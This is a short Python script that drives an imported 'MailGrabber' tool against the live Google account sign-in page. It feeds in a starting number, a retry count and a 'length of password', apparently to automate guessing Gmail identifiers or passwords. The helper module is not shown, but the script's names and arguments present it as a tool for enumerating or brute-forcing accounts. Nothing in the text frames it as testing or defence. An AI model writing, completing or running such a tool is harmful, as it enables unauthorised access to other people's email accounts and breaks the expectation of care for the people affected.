from src.MailGrabber import MailGrabber
import time

with MailGrabber() as mail:
    mail.show_intro()
    mail.go_to_gmail("https://accounts.google.com/v3/signin/identifier?dsh=S1225616175%3A1678737332875395&authuser=0"
                     "&continue=https%3A%2F%2Fmail.google.com&ec=GAlAFw&hl=en-GB&service=mail&flowName=GlifWebSignIn"
                     "&flowEntry=AddSession")
    #
    # mail.start_grabbing("//input[@id='identifierId']", input("Enter a starting number => "),
    #                     int(input("How many time do you want to keep trying? => ")),
    #                     int(input("Set a length of password => ")))
    #

    mail.start_grabbing(
        "//input[@id='identifierId']",
        "234234234234", 10, 8
    )

# schedule.every(1).minutes.do(execute)


